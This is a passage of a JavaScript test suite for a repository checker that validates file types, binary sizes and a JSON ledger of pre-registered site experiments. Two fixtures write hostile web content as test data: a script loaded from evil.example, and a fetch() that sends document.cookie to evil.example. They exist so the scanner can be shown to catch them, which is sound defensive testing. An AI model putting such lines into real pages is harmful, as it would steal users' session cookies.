    expect('binaries over 2 MB in total', { setup: () => { for (let i = 0; i < 4; i += 1) write(`public/og/b${i}.png`, png(550)); }, rules: ['size'] });
    expect('a NUL byte cannot hide public HTML from the scan', { setup: () => write('public/landing.html', "\0<script src='https://evil.example/t.js'></script>\n"), rules: ['file-type'], messages: ['not UTF-8 text'] });
    expect('a NUL byte cannot hide a public script from the scan', { setup: () => write('public/w.js', "/*\0*/ fetch('https://evil.example/?'+document.cookie)\n"), rules: ['file-type'] });
    expect('symbolic link', { setup: () => fs.symlinkSync('/etc/hostname', path.join(dir, 'public/link.txt')), rules: ['file-type'] });

    // Ledger: shape
    expect('no ledger line added', { ledger: false, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), rules: ['ledger'], messages: ['adds no line'] });
    const ledgerCase = (label, lineText, wanted = ['ledger'], options = {}) => expect(label, { ledger: false, ...options, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${lineText}\n`), rules: wanted });
    ledgerCase('ledger line is not JSON', '{not json');
    ledgerCase('ledger line is an array', '[1,2]');
    ledgerCase('ledger key missing', JSON.stringify((({ hypothesis, ...rest }) => rest)(JSON.parse(proposal()))));
    ledgerCase('ledger id malformed', entry('Home Hero'));
    ledgerCase('ledger id reused', entry('2026-10-01-first'));
    ledgerCase('ledger date invalid', proposal({ date: '2026-02-30' }));
    ledgerCase('ledger kind unknown', proposal({ kind: 'tweak' }));
    ledgerCase('ledger status unknown', proposal({ status: 'done' }));
    // A status named like a built-in property of every object is still just an unknown status, never a crash.
    for (const status of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
      ledgerCase(`ledger status ${status}`, proposal({ status }), ['ledger'], { messages: ['"status" must be one of proposed, shipped, reverted, concluded'] });
    }
    ledgerCase('ledger verdict unknown', proposal({ verdict: 'win' }));
    ledgerCase('ledger pr is a string', proposal({ pr: '61' }));
    ledgerCase('ledger guardrails not an array', proposal({ guardrails: 'bounce' }));
    ledgerCase('ledger baseline not an object', proposal({ baseline: 0.4 }));
    ledgerCase('ledger result not an object', proposal({ result: 'good' }));
    ledgerCase('ledger evaluate_after null for a change', proposal({ evaluate_after: null }));
    ledgerCase('ledger evaluate_after null for a fix', proposal({ kind: 'fix', evaluate_after: null }), []);
    ledgerCase('ledger evaluate_after null for a revert', proposal({ kind: 'revert', evaluate_after: null }), []);
    ledgerCase('ledger evaluate_after null for a conclusion', proposal({ kind: 'conclude', evaluate_after: null }), []);
    ledgerCase('ledger line wrapped over two lines', `${proposal().replace(',"title"', ',\n"title"')}`, ['ledger'], { messages: ['one JSON object on one line'] });
    ledgerCase('ledger with extra keys', proposal({ notes: 'context', evaluated_on: null, experiment: 'home-hero' }), []);
    // Ledger: the title, hypothesis and decision rule are never blank, in any kind of entry.
    for (const field of ['title', 'hypothesis', 'decision_rule']) {
      for (const [label, value] of [['empty', ''], ['blank', ' \t ']]) ledgerCase(`ledger ${field} ${label}`, proposal({ [field]: value }), ['ledger'], { messages: [`"${field}" is empty`] });
      ledgerCase(`ledger ${field} not a string`, proposal({ [field]: ['text'] }), ['ledger'], { messages: [`"${field}" must be a string`], absent: [`"${field}" is empty`] });
    }
    ledgerCase('a fix with a blank decision rule', proposal({ kind: 'fix', evaluate_after: null, decision_rule: '  ' }), ['ledger'], { messages: ['"decision_rule" is empty'] });
    ledgerCase('a closed-unmerged record with a blank hypothesis', entry('2026-09-20-stuck', { status: 'reverted', verdict: 'inconclusive', pr: 55, notes: 'Closed unmerged.', hypothesis: '' }), ['ledger'], { pr: 61, messages: ['"hypothesis" is empty'] });
    // Ledger: experiments need explicit, finite, pre-registered stopping rules; other kinds keep their schema.
    const EXPERIMENT = { kind: 'experiment', experiment: 'home-hero', pages: ['/'], min_sample: 150, max_days: 42 };
    ledgerCase('experiment with the default sample and duration', proposal(EXPERIMENT), []);
    ledgerCase('experiment with the smallest sample and duration', proposal({ ...EXPERIMENT, min_sample: 1, max_days: 1, evaluate_after: '2026-10-15' }), []);
    ledgerCase('experiment with the largest exactly representable integer sample', proposal({ ...EXPERIMENT, min_sample: Number.MAX_SAFE_INTEGER }), []);
    for (const field of ['min_sample', 'max_days']) {
      for (const [label, value] of [['missing', undefined], ['null', null], ['zero', 0], ['negative', -1], ['fraction', 1.5], ['string', '150'], ['boolean', true], ['array', [150]], ['object', { n: 150 }], ['unsafe integer', Number.MAX_SAFE_INTEGER + 1]]) {
        ledgerCase(`experiment ${field} is ${label}`, proposal({ ...EXPERIMENT, [field]: value }), ['ledger'], { messages: [`requires "${field}"`] });
      }
      ledgerCase(`experiment ${field} overflows to infinity`, proposal(EXPERIMENT).replace(`"${field}":${EXPERIMENT[field]}`, `"${field}":1e309`), ['ledger'], { messages: [`requires "${field}"`] });
    }
    ledgerCase('experiment duration exceeds 42 days', proposal({ ...EXPERIMENT, max_days: 43 }), ['ledger'], { messages: ['"max_days" to be an integer from 1 to 42'] });
    ledgerCase('experiment cannot substitute evaluate_after for stopping rules', proposal({ ...EXPERIMENT, min_sample: undefined, max_days: undefined }), ['ledger'], { messages: ['requires "min_sample"', 'requires "max_days"'] });
    ledgerCase('change may leave duration null', proposal({ min_sample: 150, max_days: null }), []);
    // The record of a pull request that closed unmerged (skill step 1.3): reverted, verdict inconclusive or null, its pr and why it closed.
    const CLOSED = { status: 'reverted', verdict: 'inconclusive', pr: 55, notes: 'Closed unmerged after 7 days; its premise is gone.' };
    ledgerCase('closed-unmerged experiment keeps valid stopping rules', entry('2026-09-20-stuck', { ...EXPERIMENT, ...CLOSED }), [], { pr: 61 });
    ledgerCase('closed-unmerged exception does not waive experiment stopping rules', entry('2026-09-20-stuck', { kind: 'experiment', ...CLOSED, min_sample: undefined }), ['ledger'], { pr: 61, messages: ['requires "min_sample"', 'requires "max_days"'] });
    // Ledger: a before/after change pre-registers its minimum sample too; fix, revert and conclude entries are not judged on one.
    ledgerCase('change with the smallest sample', proposal({ min_sample: 1 }), []);
    for (const [label, value] of [['missing', undefined], ['null', null], ['zero', 0], ['negative', -1], ['fraction', 1.5], ['string', '150'], ['boolean', true], ['array', [150]], ['unsafe integer', Number.MAX_SAFE_INTEGER + 1]]) {
      ledgerCase(`change min_sample is ${label}`, proposal({ min_sample: value }), ['ledger'], { messages: ['a change requires "min_sample" to be a positive safe integer'] });
    }
    ledgerCase('change min_sample overflows to infinity', proposal().replace('"min_sample":150', '"min_sample":1e309'), ['ledger'], { messages: ['a change requires "min_sample"'] });
    for (const kind of ['fix', 'revert', 'conclude']) ledgerCase(`a ${kind} needs no min_sample`, proposal({ kind, evaluate_after: null, min_sample: undefined }), []);
    ledgerCase('closed-unmerged exception does not waive a change\'s minimum sample', entry('2026-09-20-stuck', { ...CLOSED, min_sample: undefined }), ['ledger'], { pr: 61, messages: ['a change requires "min_sample"'] });
    // Ledger: a change or an experiment registers a measured baseline: a window of 7 to 56 days that ends by the entry's
    // date, a positive whole count of visits, and non-negative finite numbers. Other kinds may record any object.
    const WINDOW = '2026-09-16..2026-10-13';
    for (const fields of [{}, EXPERIMENT]) {
      const kind = fields.kind || 'change';
      const measured = (baseline) => proposal({ ...fields, baseline });
      for (const [label, baseline] of [
        ['visits', { window: WINDOW, visits: 548, answered: 120 }],
        ['n', { window: WINDOW, n: 548 }],
        ['both counts', { window: WINDOW, visits: 548, n: 548 }],
        ['the shortest window', { window: '2026-10-07..2026-10-13', visits: 120 }],
        ['the longest window', { window: '2026-08-19..2026-10-13', visits: 900 }],
        ['a window that ends on its date', { window: '2026-09-17..2026-10-14', visits: 548 }],
        ['text, zero and nested numbers', { window: WINDOW, visits: 548, device: 'Mobile', rate: 0, by_device: { mobile: { visits: 400, answered: 80 } }, lcp_p75_ms: [2400, 2600] }],
      ]) ledgerCase(`${kind} baseline with ${label}`, measured(baseline), []);
      for (const [label, baseline, messages] of [
        ['nothing in it', {}, ['needs "baseline"."window"', 'needs "baseline"."visits" (or "n")']],
        ['only a note', { note: 'No data yet.' }, ['needs "baseline"."window"', 'needs "baseline"."visits" (or "n")']],
        ['no window', { visits: 548 }, ['needs "baseline"."window"']],
        ['a window that is not two dates', { window: '2026-09-16/2026-10-13', visits: 548 }, ['needs "baseline"."window"']],
        ['a window with an impossible date', { window: '2026-09-16..2026-02-30', visits: 548 }, ['needs "baseline"."window"']],
        ['a window that is a list', { window: ['2026-09-16', '2026-10-13'], visits: 548 }, ['needs "baseline"."window"']],
        ['a window that ends before it starts', { window: '2026-10-13..2026-09-16', visits: 548 }, ['ends before it starts']],
        ['a window of 6 days', { window: '2026-10-08..2026-10-13', visits: 548 }, ['covers 6 days; a baseline covers 7 to 56 whole days']],
        ['a window of 57 days', { window: '2026-08-18..2026-10-13', visits: 548 }, ['covers 57 days; a baseline covers 7 to 56 whole days']],
        ['a window after its date', { window: '2026-09-18..2026-10-15', visits: 548 }, ['ends after the entry\'s date 2026-10-14']],
        ['no count of visits', { window: WINDOW, answered: 120 }, ['needs "baseline"."visits" (or "n")']],
        ...[0, -5, 1.5, '548', null, true, [548]].map((visits) => [`visits ${JSON.stringify(visits)}`, { window: WINDOW, visits }, ['"baseline"."visits" is', 'it counts visits, a positive whole number']]),
        ['a valid visits count but n zero', { window: WINDOW, visits: 548, n: 0 }, ['"baseline"."n" is 0']],
        ['visits and n that disagree', { window: WINDOW, visits: 548, n: 120 }, ['"baseline"."visits" 548 and "baseline"."n" 120 disagree']],
        ['a negative number', { window: WINDOW, visits: 548, answered: -1 }, ['"baseline"."answered" is -1; baseline numbers are non-negative and finite']],
        ['a nested negative number', { window: WINDOW, visits: 548, by_device: { mobile: { answered: -2 } } }, ['"baseline"."by_device.mobile.answered" is -2']],
        ['a negative number in a list', { window: WINDOW, visits: 548, lcp_p75_ms: [2400, -1] }, ['"baseline"."lcp_p75_ms[1]" is -1']],
        ['a null number', { window: WINDOW, visits: 548, answered: null }, ['"baseline"."answered" is null; baseline values are numbers, text, or lists or objects of them']],
        ['a true or false value', { window: WINDOW, visits: 548, phones: true }, ['"baseline"."phones" is true']],
      ]) ledgerCase(`${kind} baseline with ${label}`, measured(baseline), ['ledger'], { messages });
      ledgerCase(`${kind} baseline number overflows to infinity`, measured({ window: WINDOW, visits: 548, answered: 7 }).replace('"answered":7', '"answered":1e309'), ['ledger'], { messages: ['"baseline"."answered" is Infinity'] });
      ledgerCase(`${kind} baseline count overflows to infinity`, measured({ window: WINDOW, visits: 7 }).replace('"visits":7', '"visits":1e309'), ['ledger'], { messages: ['"baseline"."visits" is Infinity'] });
    }
    for (const kind of ['fix', 'revert', 'conclude']) {
      for (const [label, baseline] of [['an empty object', {}], ['only a note', { note: 'Crashed pages sent no analytics.' }], ['any numbers', { rate: -1 }]]) ledgerCase(`a ${kind} baseline with ${label}`, proposal({ kind, evaluate_after: null, baseline }), []);
      ledgerCase(`a ${kind} baseline that is not an object`, proposal({ kind, evaluate_after: null, baseline: 'none' }), ['ledger'], { messages: ['"baseline" must be an object'] });
    }
    // Ledger: a change registers its before/after window length, 14 or 28 days; no other kind has one. Only an
    // experiment has a maximum duration, and min_sample is optional for the kinds that are not judged on a sample.
    ledgerCase('change with 28-day windows', proposal({ window_days: 28, evaluate_after: addDays('2026-10-14', 28) }), []);
    for (const [label, value] of [['missing', undefined], ['null', null], ['7', 7], ['21', 21], ['a string', '14'], ['zero', 0]]) {
      ledgerCase(`change window_days ${label}`, proposal({ window_days: value }), ['ledger'], { messages: ['a change requires "window_days", 14 or 28'] });
    }
    ledgerCase('experiment with window_days', proposal({ ...EXPERIMENT, window_days: 14 }), ['ledger'], { messages: ['only a change has "window_days"; an experiment leaves it out or null (its window is "max_days")'] });
    ledgerCase('experiment with null window_days', proposal({ ...EXPERIMENT, window_days: null }), []);
    for (const kind of ['fix', 'revert', 'conclude']) {
      ledgerCase(`a ${kind} with window_days`, proposal({ kind, evaluate_after: null, window_days: 14 }), ['ledger'], { messages: [`only a change has "window_days"; ${aKind(kind)} leaves it out or null`] });
      ledgerCase(`a ${kind} with max_days`, proposal({ kind, evaluate_after: null, max_days: 30 }), ['ledger'], { messages: [`only an experiment has "max_days"; ${aKind(kind)} leaves it out or null`] });
    }
    ledgerCase('a change with max_days', proposal({ max_days: 30 }), ['ledger'], { messages: ['only an experiment has "max_days"; a change leaves it out or null'] });
    ledgerCase('a fix with null min_sample', proposal({ kind: 'fix', evaluate_after: null, min_sample: null }), []);
    for (const [label, value] of [['zero', 0], ['a string', '150'], ['a fraction', 1.5]]) {
      ledgerCase(`a fix with min_sample ${label}`, proposal({ kind: 'fix', evaluate_after: null, min_sample: value }), ['ledger'], { messages: ['"min_sample" must be a positive safe integer or null'] });
    }
    // Ledger: evaluate_after falls in the range its kind allows, counted from the entry's date (2026-10-14 here).
    const evaluatedAfter = (days, fields = {}) => proposal({ ...fields, evaluate_after: addDays('2026-10-14', days) });
    for (const days of [14, 90]) ledgerCase(`change evaluated ${days} days after its date`, evaluatedAfter(days), []);
    for (const days of [13, 91, 0, -1, 400]) ledgerCase(`change evaluated ${days} days after its date`, evaluatedAfter(days), ['ledger'], { messages: ['a change is evaluated 14 to 90 days after it is registered'] });
    ledgerCase('change with 28-day windows evaluated 27 days after its date', evaluatedAfter(27, { window_days: 28 }), ['ledger'], { messages: ['a change is evaluated 28 to 90 days after it is registered'] });
    // An experiment is evaluated at its planned end: no later than its max_days plus a day to ship (a later ship moves
    // its due date instead), and from 7 days, or its max_days if shorter.
    for (const [days, maxDays] of [[7, 42], [14, 42], [43, 42], [7, 7], [8, 7], [1, 1], [2, 1], [3, 3], [4, 3]]) ledgerCase(`experiment of ${maxDays} days evaluated ${days} days after its date`, evaluatedAfter(days, { ...EXPERIMENT, max_days: maxDays }), []);
    for (const [days, maxDays] of [[6, 42], [44, 42], [56, 42], [42, 28], [9, 7], [21, 7], [0, 1], [3, 1], [15, 1], [2, 3], [-3, 42], [365, 42]]) {
      ledgerCase(`experiment of ${maxDays} days evaluated ${days} days after its date`, evaluatedAfter(days, { ...EXPERIMENT, max_days: maxDays }), ['ledger'], { messages: [`an experiment is evaluated ${Math.min(7, maxDays)} to ${maxDays + 1} days after it is registered`] });
    }
    // A fix, a revert and a conclusion register no windows or sample, so they have no evaluation date to fall due on.
    for (const kind of ['fix', 'revert', 'conclude']) {
      for (const [label, value] of [['0 days after its date', '2026-10-14'], ['30 days after its date', '2026-11-13'], ['90 days after its date', '2027-01-12'], ['before its date', '2026-10-13'], ['that is not a date', 'soon']]) {
        ledgerCase(`a ${kind} with an evaluation date ${label}`, proposal({ kind, evaluate_after: value }), ['ledger'], { messages: [`${aKind(kind)} is not judged later, so "evaluate_after" is null`] });
      }
    }
    // Ledger: an experiment names its registry key and pages, and may name an area; any entry that names them uses valid ones.
    for (const [label, fields, message] of [
      ['no key', { experiment: undefined }, 'an experiment requires "experiment"'],
      ['a null key', { experiment: null }, 'an experiment requires "experiment"'],
      ['a key with capitals and a space', { experiment: 'Home Hero' }, 'an experiment requires "experiment"'],
      ['no pages', { pages: undefined }, 'an experiment requires "pages"'],
      ['no page in its pages', { pages: [] }, 'an experiment requires "pages"'],
      ['a page twice', { pages: ['/', '/'] }, 'an experiment requires "pages"'],
      ['a page with a trailing slash', { pages: ['/tools/'] }, 'an experiment requires "pages"'],
      ['a page that is a URL', { pages: ['https://splithappens.run/'] }, 'an experiment requires "pages"'],
      ['a null area', { area: null }, '"area" must be a lower-case, hyphenated slug'],
      ['an area with a space', { area: 'hero area' }, '"area" must be a lower-case, hyphenated slug'],
    ]) ledgerCase(`experiment with ${label}`, proposal({ ...EXPERIMENT, ...fields }), ['ledger', 'experiment'], { messages: [message] });
    for (const [label, fields] of [['an area', { area: 'hero' }], ['the whole page as its area', { area: '*' }], ['every page', { pages: ['*'] }], ['several pages', { pages: ['/', '/tools', '/stories/final-kick'] }]]) {
      ledgerCase(`experiment with ${label}`, proposal({ ...EXPERIMENT, ...fields }), []);
    }
    ledgerCase('a change naming no experiment', proposal({ experiment: null, pages: null }), []);
    ledgerCase('a fix on every page', proposal({ kind: 'fix', evaluate_after: null, pages: ['*'] }), []);
    for (const [label, fields, message] of [['an invalid key', { experiment: 'Home Hero' }, '"experiment" must be a key'], ['a page without its slash', { pages: ['tools'] }, '"pages" must be nonempty'], ['no page', { pages: [] }, '"pages" must be nonempty'], ['an area that is a number', { area: 1 }, '"area" must be']]) {
      ledgerCase(`a change naming ${label}`, proposal(fields), ['ledger'], { messages: [message] });
    }
    // Ledger: notes are text; a new entry is dated the day it is written, never after its commit (2026-10-15 here).
    for (const notes of [7, ['why'], { why: 'x' }]) ledgerCase(`a new entry with notes ${JSON.stringify(notes)}`, proposal({ notes }), ['ledger'], { messages: ['"notes" must be text'] });
    ledgerCase('a new entry with null notes', proposal({ notes: null }), []);
    ledgerCase('a new entry dated after its commit', proposal({ date: '2026-10-16', evaluate_after: '2026-10-30' }), ['ledger'], { messages: ['"date" 2026-10-16 is after today, 2026-10-15 (UTC)'] });
    // Today is the head commit's day, or the clock's if that is earlier: anyone can date a commit in the future, and
    // a later clock never loosens an honest commit's bound, so a result does not change with the day it is run.
    const FUTURE = { date: '2026-12-01', baseline: { window: '2026-11-03..2026-11-30', visits: 548 }, evaluate_after: '2026-12-20' };
    expect('a commit dated in the future cannot date an entry in the future', { branch: 'autopilot/2026-12-01-hero', ledger: false, commitDate: '2026-12-01T12:00:00+00:00', setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${entry('2026-12-01-hero', FUTURE)}\n`); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['ledger'], messages: ['"date" 2026-12-01 is after today, 2026-10-15 (UTC)'] });
    expect('the same entry passes once its day has come', { branch: 'autopilot/2026-12-01-hero', ledger: false, commitDate: '2026-12-01T12:00:00+00:00', now: '2026-12-01T13:00:00+00:00', setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${entry('2026-12-01-hero', FUTURE)}\n`); write('components/Card.tsx', 'export const y = 2;\n'); } });
    expect('a later clock does not loosen an honest commit', { ledger: false, now: '2026-12-01T12:00:00+00:00', setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal({ date: '2026-10-16', evaluate_after: '2026-10-30' })}\n`), rules: ['ledger'], messages: ['"date" 2026-10-16 is after today, 2026-10-15 (UTC)'] });
    // Ledger: a new proposed entry has not shipped or been judged.
    for (const [field, value] of [['shipped_on', '2026-10-14'], ['verdict', 'keep'], ['result', { rate: 0.45 }], ['evaluated_on', '2026-10-14']]) {
      ledgerCase(`a new proposed entry with ${field}`, proposal({ [field]: value }), ['ledger'], { messages: [`"${field}" is ${JSON.stringify(value)} on a "proposed" entry; it stays null until`] });
    }
    // Ledger: a new entry's metrics are names the base's autopilot/metrics.md §1 table defines, exactly.
    ledgerCase('registered primary metric and guardrails', proposal({ guardrails: ['one_page_no_action_rate@v1', 'error_visit_rate@v1'] }), []);
    for (const [label, name] of [['empty', ''], ['invented', 'engagement_score@v1'], ['unversioned', 'answered_visit_rate'], ['another version', 'answered_visit_rate@v2'], ['in capitals', 'Answered_visit_rate@v1'], ['with its backticks', '`answered_visit_rate@v1`'], ['with a space', 'answered_visit_rate@v1 '], ['only mentioned above the table', 'engaged_visit_rate@v1'], ['only mentioned in §1 prose', 'tool_used@v1'], ['in a table outside §1', 'bounce_rate@v1']]) {
      ledgerCase(`primary_metric ${label}`, proposal({ primary_metric: name }), ['ledger'], { messages: [`"primary_metric" ${JSON.stringify(name)} is not a metric defined in ${METRICS} §1`, 'answered_visit_rate@v1, one_page_no_action_rate@v1, error_visit_rate@v1'] });
    }
    for (const [label, guardrails, message] of [['invented', ['bounce'], '"guardrails" "bounce" is not a metric'], ['one of two invented', ['error_visit_rate@v1', 'bounce_rate@v1'], '"guardrails" "bounce_rate@v1" is not a metric'], ['two invented', ['bounce', ''], '"guardrails" "bounce", "" are not metrics'], ['not a string', [1], '"guardrails" 1 is not a metric'], ['an object', [{ name: 'error_visit_rate@v1' }], '"guardrails" {"name":"error_visit_rate@v1"} is not a metric']]) {
      ledgerCase(`guardrails ${label}`, proposal({ guardrails }), ['ledger'], { messages: [message] });
    }
    ledgerCase('a change with no guardrail', proposal({ guardrails: [] }), ['ledger'], { messages: ['"guardrails" is empty; a "change" entry needs at least one'] });
    ledgerCase('an experiment with no guardrail', proposal({ kind: 'experiment', experiment: 'home-hero', pages: ['/'], min_sample: 150, max_days: 42, guardrails: [] }), ['ledger'], { messages: ['"guardrails" is empty; an "experiment" entry needs at least one'] });
    for (const kind of ['fix', 'revert', 'conclude']) {
      ledgerCase(`a ${kind} with no guardrail`, proposal({ kind, evaluate_after: null, guardrails: [] }), []);
      ledgerCase(`a ${kind} with an invented guardrail`, proposal({ kind, evaluate_after: null, guardrails: ['bounce'] }), ['ledger'], { messages: ['"guardrails" "bounce" is not a metric'] });
    }
    ledgerCase('a closed-unmerged record is a new entry too', entry('2026-09-20-stuck', { ...CLOSED, primary_metric: 'engaged_visit_rate' }), ['ledger'], { pr: 61, messages: ['"primary_metric" "engaged_visit_rate" is not a metric'] });
    // Ledger: each new proposal belongs to this branch, including ledger-only proposals.
    for (const kind of LEDGER_KINDS) {
      const fields = { ...(kind === 'experiment' ? EXPERIMENT : {}), ...(JUDGED_KINDS.includes(kind) ? {} : { evaluate_after: null }), kind };
      ledgerCase(`${kind} entry matches the branch id`, proposal(fields), []);
      ledgerCase(`${kind} entry has another slug`, entry('2026-10-14-other', fields), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    }
    ledgerCase('new entry date in range does not excuse an id with another date', entry('2026-10-13-test'), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id cannot merely extend the branch id', entry(`${CHANGE_ID}-extra`), ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id is bound even when its pr matches', entry('2026-10-14-other', { pr: 61 }), ['ledger'], { pr: 61, messages: [`"id" must be "${CHANGE_ID}"`] });
    ledgerCase('new entry id follows another valid branch', entry('2026-10-15-home-hero', { evaluate_after: '2026-10-29' }), [], { branch: 'autopilot/2026-10-15-home-hero' });
    ledgerCase('an extra proposal cannot borrow the matching entry id', `${proposal()}\n${entry('2026-10-14-other')}`, ['ledger'], { messages: [`"id" must be "${CHANGE_ID}"`] });
    // Ledger: a new entry is pre-registered
    ledgerCase('new entry already concluded', proposal({ status: 'concluded', verdict: 'keep', result: { delta: 0.1 } }));
    ledgerCase('new change already shipped', proposal({ status: 'shipped' }));
    ledgerCase('new revert entry already shipped', proposal({ kind: 'revert', evaluate_after: null, status: 'shipped' }));
    ledgerCase('new entry with a ship date', proposal({ shipped_on: '2026-10-14' }));
    ledgerCase('new entry with a verdict', proposal({ verdict: 'keep' }));
    ledgerCase('new entry with a result', proposal({ result: { delta: 0.1 } }));
    ledgerCase('new entry backdated', proposal({ date: '2026-09-01' }));
    ledgerCase('new entry dated in the future', proposal({ date: '2026-10-20' }));
    ledgerCase('new entry dated the day before the branch', proposal({ date: '2026-10-13' }), []);
    ledgerCase('new entry naming another pull request', proposal({ pr: 12 }), ['ledger'], { pr: 61 });
    ledgerCase('new entry naming this pull request', proposal({ pr: 61 }), [], { pr: 61 });
    ledgerCase('record of a pull request that closed unmerged', entry('2026-09-20-stuck', CLOSED), [], { pr: 61 });
    ledgerCase('closed-unmerged record may have a null verdict', entry('2026-09-20-stuck', { ...CLOSED, verdict: null }), [], { pr: 61 });
    ledgerCase('record of a closed pull request with verdict revert', entry('2026-09-20-stuck', { ...CLOSED, verdict: 'revert' }), ['ledger'], { pr: 61, messages: ['has "verdict" null or "inconclusive"'] });
    // Its provenance is required: the pull request that closed, and a note saying why. Its other exceptions stay.
    for (const [label, value] of [['missing', undefined], ['null', null], ['zero', 0], ['negative', -55], ['a fraction', 5.5], ['a string', '55'], ['a URL', 'https://github.com/koolkam00/pace-notes/pull/55']]) {
      ledgerCase(`closed-unmerged record with pr ${label}`, entry('2026-09-20-stuck', { ...CLOSED, pr: value }), ['ledger'], { pr: 61, messages: ['requires "pr", the number of the pull request that closed'], absent: ['requires "notes"', '"id" must be', '"date"'] });
    }
    for (const [label, value] of [['missing', undefined], ['null', null], ['empty', ''], ['blank', '   '], ['a number', 7], ['a list', ['Closed.']]]) {
      ledgerCase(`closed-unmerged record with notes ${label}`, entry('2026-09-20-stuck', { ...CLOSED, notes: value }), ['ledger'], { pr: 61, messages: ['requires "notes" saying why it closed'], absent: ['requires "pr"', '"id" must be', '"date"'] });
    }
    ledgerCase('closed-unmerged record with neither pr nor notes', entry('2026-09-20-stuck', { ...CLOSED, pr: null, notes: undefined }), ['ledger'], { pr: 61, messages: ['requires "pr"', 'requires "notes" saying why it closed'] });
    // It never shipped, so it was never evaluated: no result and no evaluation date.
    ledgerCase('closed-unmerged record with a result', entry('2026-09-20-stuck', { ...CLOSED, result: { rate: 0.4 } }), ['ledger'], { pr: 61, messages: ['"result" is {"rate":0.4} on a "reverted" entry without "shipped_on"; an entry that never shipped'] });
    ledgerCase('closed-unmerged record with an evaluation date', entry('2026-09-20-stuck', { ...CLOSED, evaluated_on: '2026-09-25' }), ['ledger'], { pr: 61, messages: ['"evaluated_on" is "2026-09-25" on a "reverted" entry without "shipped_on"; an entry that never shipped (the record of a pull request that closed unmerged) was never evaluated'] });
    ledgerCase('closed-unmerged record with a null evaluation date', entry('2026-09-20-stuck', { ...CLOSED, evaluated_on: null }), [], { pr: 61 });
    ledgerCase('closed-unmerged record with a ship date', entry('2026-09-20-stuck', { ...CLOSED, shipped_on: '2026-09-25' }), ['ledger'], { pr: 61, messages: ['has "shipped_on" null; it never merged'] });
    const closed = (id = '2026-09-20-stuck') => entry(id, CLOSED);
    for (const id of ['2026-09-20-stuck', CHANGE_ID]) {
      expect(`a closed-unmerged record (${id}) cannot register a site change`, { ledger: false, setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${closed(id)}\n`); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['ledger'], messages: ['a closed-unmerged record does not pre-register a site change'] });
    }
    expect('a site change and a closed-unmerged record with its own proposal', { setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${closed()}\n`); write('components/Card.tsx', 'export const y = 2;\n'); } });
    expect('ten new ledger lines', { ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), Array.from({ length: 10 }, (_, i) => `${entry(`2026-10-14-bulk-${i}`, { ...CLOSED, pr: 40 + i })}\n`).join('')) });
    expect('eleven new ledger lines', { ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), Array.from({ length: 11 }, (_, i) => `${entry(`2026-10-14-bulk-${i}`, { ...CLOSED, pr: 40 + i })}\n`).join('')), rules: ['ledger'], messages: ['adds 11 lines'] });
    // Ledger: existing entries
    expect('existing ledger line removed', { ledger: false, setup: () => write(LEDGER, `${proposal()}\n`), rules: ['ledger'] });
    expect('existing ledger line moved', { ledger: false, setup: () => write(LEDGER, `${proposal()}\n${BASE_LEDGER}`), rules: ['ledger'], messages: ['moved from line 1'] });
    expect('existing ledger entry title changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, title: 'Rewritten' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"title"'] });
    expect('existing ledger entry decision rule changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, decision_rule: 'Anything goes.' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"decision_rule"'] });
    expect('existing ledger entry pr changed', { ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, pr: 12 })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"pr" was already 60'] });
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-judged');
    write(LEDGER, `${entry('2026-10-01-hero', { status: 'reverted', pr: 58, verdict: 'revert', result: { delta: -0.04 } })}\n${entry('2026-10-02-menu', { status: 'proposed' })}\n`);
    run('add', '-A'); runAt('2026-10-03T16:00:00+00:00', 'commit', '-q', '-m', 'judged (the menu change merged on 2026-10-03)');
    expect('a reverted entry flipped to keep', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-hero', { status: 'shipped', pr: 58, verdict: 'keep', result: { delta: 0.06 } })}\n${entry('2026-10-02-menu', { status: 'proposed' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"status" cannot go from "reverted"', '"verdict" was already', '"result" was already'] });
    const HERO = entry('2026-10-01-hero', { status: 'reverted', pr: 58, verdict: 'revert', result: { delta: -0.04 } });
    expect('a proposed entry shipped with its pull request and date', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n${proposal()}\n`) });
    expect('a ship date that is not a date', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: 'Oct 3' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"shipped_on" must be null or a YYYY-MM-DD date'] });
    // Bookkeeping: a pull request that changes only existing ledger lines, the backlog and the learnings needs no new line.
    expect('bookkeeping only: ledger, backlog and learnings', { base: 'main-judged', ledger: false, setup: () => { write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`); write('autopilot/backlog.md', '# Backlog\n- Menu shipped.\n'); write('autopilot/LEARNINGS.md', '- 2026-10-14 (recordings, 9): phones stop at chapter 2.\n'); } });
    expect('bookkeeping only: the backlog alone', { ledger: false, setup: () => write('autopilot/backlog.md', '# Backlog\n- Re-ranked.\n') });
